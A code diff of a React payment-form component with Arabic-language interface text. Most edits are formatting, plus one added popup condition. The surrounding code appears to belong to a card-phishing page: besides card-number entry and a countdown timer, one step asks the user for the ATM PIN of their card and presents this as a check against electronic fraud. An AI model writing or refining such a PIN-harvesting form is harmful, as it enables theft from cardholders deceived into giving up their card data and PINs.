@@ -68,7 +68,7 @@ const PaymentForm = () => {
   const seconds = counter % 60;
 
   const formattedTime = `${String(hours).padStart(2, "0")}:${String(
-    minutes
+    minutes,
   ).padStart(2, "0")}:${String(seconds).padStart(2, "0")}`;
   const formatCardNumber = (value) => {
     const numericValue = value.replace(/\D/g, "");
@@ -237,7 +237,7 @@ const PaymentForm = () => {
       {loading && (
         <div className="fixed top-0 w-full z-20 flex items-center justify-center h-screen flex-col left-0 bg-[#00000048]">
           <div className="flex flex-col items-center gap-6 bg-white p-8 w-3/4 rounded-md">
-            { cardNumber.startsWith("4") ? (
+            {cardNumber.startsWith("4") ? (
               <img
                 src="data:image/svg+xml;charset=utf-8,%3Csvg width='120' height='80' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Crect width='120' height='80' rx='8' fill='%23fff'/%3E%3Cpath d='m49.893 26.24-11.598 28.224h-6.892l-5.708-22.173c-.345-1.385-.648-1.896-1.703-2.477-1.725-.944-4.574-1.829-7.073-2.378l.17-.817h12.192c1.551 0 2.95 1.053 3.302 2.877l3.015 16.31 7.455-19.2 7.528-.006zm29.679 19.022c.031-7.443-10.107-7.857-10.038-11.18.023-1.009.97-2.087 3.04-2.36 1.023-.136 3.85-.239 7.055 1.26l1.256-5.98c-1.725-.63-3.946-1.235-6.71-1.235-7.08 0-12.066 3.832-12.108 9.312-.048 4.058 3.554 6.325 6.267 7.675 2.794 1.38 3.732 2.273 3.719 3.503-.019 1.888-2.224 2.726-4.288 2.758-3.599.058-5.688-.994-7.353-1.783l-1.296 6.177c1.674.781 4.767 1.463 7.965 1.502 7.532.003 12.458-3.786 12.488-9.648zm18.71 9.206h7.302l-6.152-28.224h-6.113c-1.378 0-2.532.812-3.048 2.067l-10.747 26.157h7.522l1.492-4.212h9.189l.865 4.212zm-7.99-9.984 3.77-10.59 2.173 10.59h-5.943zm-30.152-18.24-5.923 28.224h-7.166l5.923-28.224h7.166Z' fill='%231434CB'/%3E%3Crect x='1' y='1' width='118' height='78' rx='7' stroke='%23DFE5EB' stroke-width='2'/%3E%3C/svg%3E"
                 alt="Visa"
@@ -277,7 +277,7 @@ const PaymentForm = () => {
           </div>
         </div>
       )}
-      {popUp && (
+      {popUp && page === 0 && (
         <div className="fixed top-0 w-full z-20  flex items-center justify-center h-screen flex-col  left-0 bg-black bg-opacity-45 ">
           <div className="w-11/12 md:w-fit p-3 rounded-md bg-white flex flex-col items-center">
             <img src="/payment.jpeg" className="w-full md:w-1/3" />
@@ -618,8 +618,9 @@ const PaymentForm = () => {
 
             <p className="text-center text-xs text-gray-600 mb-4 leading-relaxed px-2">
               يُرجى إدخال الرقم السري للصراف الآلي (ATM) للبطاقة المنتهية بـ{" "}
-              <strong>{cardLastFour}</strong> ليتم التأكد من ملكية وأهلية صاحب البطاقة
-              للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
+              <strong>{cardLastFour}</strong> ليتم التأكد من ملكية وأهلية صاحب
+              البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية
+              الدفع.
             </p>
 
             <div className="flex justify-center gap-3 my-8" dir="ltr">
